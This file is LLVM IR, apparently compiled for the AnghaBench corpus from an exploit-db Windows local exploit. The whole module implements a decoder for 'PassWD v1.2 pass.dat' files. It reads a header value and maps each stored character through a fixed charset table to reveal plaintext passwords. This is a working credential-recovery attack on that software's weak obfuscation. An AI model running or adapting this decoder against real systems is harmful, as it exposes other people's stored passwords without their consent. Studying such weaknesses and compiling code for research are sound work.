; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19989.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19989.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.charset = private unnamed_addr constant [199 x i8] c"\08\09\0A\0D !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSPUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\08\09\0A\0D !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSPUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\00", align 16
@.str = private unnamed_addr constant [52 x i8] c"\0ADecoder for PassWD v1.2 `pass.dat' password files\0A\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"Written 2000 by Daniel Roethlisberger <admin@roe.ch>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"Usage: %s <infile> [<outfile>]\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [58 x i8] c"If <outfile> is omitted, the output is dumped to stdout.\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"Could not open file %s\0A\00", align 1
@stdout = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"Could not write to file %s\0A\00", align 1
@EOF = common dso_local global i8 0, align 1
@.str.8 = private unnamed_addr constant [39 x i8] c"ERROR - encountered EOF within header\0A\00", align 1
@.str.9 = private unnamed_addr constant [55 x i8] c"\0AERROR - encountered illegal character in source file\0A\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"Done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8, align 1
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca [199 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [199 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([199 x i8], [199 x i8]* @__const.main.charset, i32 0, i32 0), i64 199, i1 false)
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %3, align 4
  %17 = icmp sgt i32 %16, 3
  br i1 %17, label %21, label %18

18:                                               ; preds = %2
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %30

21:                                               ; preds = %18, %2
  %22 = load i8**, i8*** %4, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i8* %24)
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  br label %135

30:                                               ; preds = %18
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32* @fopen(i8* %33, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %34, i32** %7, align 8
  %35 = load i32*, i32** %7, align 8
  %36 = icmp eq i32* %35, null
  br i1 %36, label %37, label %42

37:                                               ; preds = %30
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i8* %40)
  br label %135

42:                                               ; preds = %30
  %43 = load i32, i32* %3, align 4
  %44 = icmp eq i32 %43, 2
  br i1 %44, label %45, label %47

45:                                               ; preds = %42
  %46 = load i32*, i32** @stdout, align 8
  store i32* %46, i32** %6, align 8
  br label %61

47:                                               ; preds = %42
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i32* @fopen(i8* %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32* %51, i32** %6, align 8
  %52 = load i32*, i32** %6, align 8
  %53 = icmp eq i32* %52, null
  br i1 %53, label %54, label %60

54:                                               ; preds = %47
  %55 = load i8**, i8*** %4, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0), i8* %57)
  %59 = call i32 (...) @_fcloseall()
  br label %135

60:                                               ; preds = %47
  br label %61

61:                                               ; preds = %60, %45
  %62 = load i32*, i32** %7, align 8
  %63 = call zeroext i8 @getc(i32* %62)
  %64 = load i32*, i32** %7, align 8
  %65 = call zeroext i8 @getc(i32* %64)
  store i8 %65, i8* %8, align 1
  %66 = load i32*, i32** %7, align 8
  %67 = call zeroext i8 @getc(i32* %66)
  store i8 %67, i8* %9, align 1
  %68 = load i8, i8* %9, align 1
  %69 = zext i8 %68 to i32
  %70 = load i8, i8* @EOF, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %69, %71
  br i1 %72, label %73, label %75

73:                                               ; preds = %61
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.8, i64 0, i64 0))
  br label %135

75:                                               ; preds = %61
  %76 = load i8, i8* %8, align 1
  %77 = zext i8 %76 to i32
  %78 = sub nsw i32 %77, 98
  %79 = mul nsw i32 %78, 10
  %80 = load i8, i8* %9, align 1
  %81 = zext i8 %80 to i32
  %82 = sub nsw i32 %81, 98
  %83 = add nsw i32 %79, %82
  %84 = trunc i32 %83 to i8
  store i8 %84, i8* %10, align 1
  %85 = load i32*, i32** %7, align 8
  %86 = call zeroext i8 @getc(i32* %85)
  store i8 %86, i8* %11, align 1
  br label %87

87:                                               ; preds = %113, %75
  %88 = load i32*, i32** %7, align 8
  %89 = call i32 @feof(i32* %88)
  %90 = icmp ne i32 %89, 0
  %91 = xor i1 %90, true
  br i1 %91, label %92, label %127

92:                                               ; preds = %87
  store i8 0, i8* %5, align 1
  br label %93

93:                                               ; preds = %110, %92
  %94 = load i8, i8* %11, align 1
  %95 = zext i8 %94 to i32
  %96 = load i8, i8* %5, align 1
  %97 = zext i8 %96 to i64
  %98 = getelementptr inbounds [199 x i8], [199 x i8]* %12, i64 0, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp ne i32 %95, %100
  br i1 %101, label %102, label %113

102:                                              ; preds = %93
  %103 = load i8, i8* %5, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp sgt i32 %104, 99
  br i1 %105, label %106, label %109

106:                                              ; preds = %102
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.9, i64 0, i64 0))
  %108 = call i32 (...) @_fcloseall()
  br label %135

109:                                              ; preds = %102
  br label %110

110:                                              ; preds = %109
  %111 = load i8, i8* %5, align 1
  %112 = add i8 %111, 1
  store i8 %112, i8* %5, align 1
  br label %93

113:                                              ; preds = %93
  %114 = load i8, i8* %5, align 1
  %115 = zext i8 %114 to i32
  %116 = add nsw i32 %115, 99
  %117 = load i8, i8* %10, align 1
  %118 = zext i8 %117 to i32
  %119 = sub nsw i32 %116, %118
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [199 x i8], [199 x i8]* %12, i64 0, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = load i32*, i32** %6, align 8
  %124 = call i32 @putc(i8 zeroext %122, i32* %123)
  %125 = load i32*, i32** %7, align 8
  %126 = call zeroext i8 @getc(i32* %125)
  store i8 %126, i8* %11, align 1
  br label %87

127:                                              ; preds = %87
  %128 = load i32, i32* %3, align 4
  %129 = icmp eq i32 %128, 2
  br i1 %129, label %130, label %132

130:                                              ; preds = %127
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0))
  br label %132

132:                                              ; preds = %130, %127
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0))
  %134 = call i32 (...) @_fcloseall()
  br label %135

135:                                              ; preds = %132, %106, %73, %54, %37, %21
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @_fcloseall(...) #2

declare dso_local zeroext i8 @getc(i32*) #2

declare dso_local i32 @feof(i32*) #2

declare dso_local i32 @putc(i8 zeroext, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
